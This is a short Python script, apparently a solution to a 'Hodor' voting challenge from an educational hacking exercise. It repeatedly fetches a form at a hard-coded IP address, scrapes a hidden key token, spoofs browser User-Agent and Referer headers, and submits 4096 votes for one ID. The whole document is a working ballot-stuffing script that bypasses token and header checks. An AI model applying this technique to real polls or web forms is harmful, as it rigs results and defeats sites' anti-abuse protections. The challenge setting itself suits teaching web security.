#!/usr/bin/python3
'''Module for Hodor level 1 challenge.'''
import requests
import re
import time

url = 'http://158.69.76.135/level2.php'
data = {'id': '650', 'holdthedoor': 'Submit'}
referer = url
agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
headers = {'User-Agent': agent, 'Referer': url}
votes = 4096
ok = 0
s = requests.Session()
s.headers.update(headers)

for i in range(votes):
    response = s.get(url, headers=headers)
    if response.status_code is not 200:
        continue
    matches = re.findall("value=\"([^\"]+)\"",
                         response.text)
    if not len(matches):
        continue

    data["key"] = matches[0]
    print(data)
    response = s.post(url, data=data)
    print(response.text)
    if response.status_code is 200:
        ok += 1
    print("{} done...".format(i + 1))

print("Done! {}/{} votes submitted.".format(ok, votes))
